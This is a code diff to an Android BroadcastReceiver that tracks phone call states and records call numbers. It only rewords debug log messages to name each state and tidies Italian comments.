@@ -67,28 +67,24 @@ public class BC extends BroadcastReceiver {
 
 				// Outgoing phone call
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): 1, number: " + number);//$NON-NLS-1$
+					Check.log(TAG + " (onReceive): 1 OUTGOING, number: " + number);//$NON-NLS-1$
 				}
 
 				call = new Call(number, Call.OUTGOING, Call.START);
-			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) { // Il
-																					// numero
-																					// lo
-																					// abbiamo
-																					// solo
-																					// qui!
+			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
+				// il numero delle chiamate entranti lo abbiamo solo qui
 				final String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
 
 				// Phone is ringing
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): 2");//$NON-NLS-1$
+					Check.log(TAG + " (onReceive): 2 RINGING, number: " + number);//$NON-NLS-1$
 				}
 
 				call = new Call(number, Call.INCOMING, Call.START);
 			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
 				// Call disconnected
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): 3");//$NON-NLS-1$
+					Check.log(TAG + " (onReceive): 3 IDLE -> END");//$NON-NLS-1$
 				}
 
 				if (call != null) {
@@ -99,16 +95,11 @@ public class BC extends BroadcastReceiver {
 
 					call.setComplete();
 				}
-			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) { // Qui
-																					// la
-																					// chiamata
-																					// e'
-																					// davvero
-																					// in
-																					// corso
+			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) { 
+				// Qui la chiamata e' davvero in corso
 				// Call answered, or issuing new outgoing call
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): 4");//$NON-NLS-1$
+					Check.log(TAG + " (onReceive): 4 OFFHOOK");//$NON-NLS-1$
 				}
 
 				if (call == null) {
@@ -117,13 +108,13 @@ public class BC extends BroadcastReceiver {
 					}
 				} else {
 					call.setComplete();
-					Check.log(TAG + " (onReceive): 4, call ready");//$NON-NLS-1$
+					Check.log(TAG + " (onReceive): 4 OFFHOOK, call ready");//$NON-NLS-1$
 				}
 
 				//call = new Call("", Call.OUTGOING, Call.START); //$NON-NLS-1$
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): default");//$NON-NLS-1$
+					Check.log(TAG + " (onReceive): default, assume END");//$NON-NLS-1$
 				}
 
 				call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
